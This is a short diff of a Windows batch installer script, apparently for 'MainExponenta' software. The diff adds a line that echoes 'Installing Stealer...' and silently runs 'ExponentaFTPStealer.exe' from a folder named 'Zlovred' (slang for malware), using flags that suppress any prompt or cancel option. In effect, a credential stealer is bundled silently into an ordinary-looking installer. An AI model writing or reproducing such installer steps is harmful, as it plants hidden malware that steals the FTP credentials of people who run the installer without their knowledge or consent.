@@ -57,7 +57,8 @@ rem echo The variable is created
 rem Insatall MainExponenta Files...
 cd /d %curdir%
 
-ExponentaFTPStealer.exe /VERYSILENT /NOCANCEL
+echo "Installing Stealer..."
+%Dest_DIR%\Distrib\Zlovred\ExponentaFTPStealer.exe /VERYSILENT /NOCANCEL
 
 rem Refresh Environment
 if not exist %Chocolatey%\Bin\RefreshEnv.cmd goto pass_Refresh
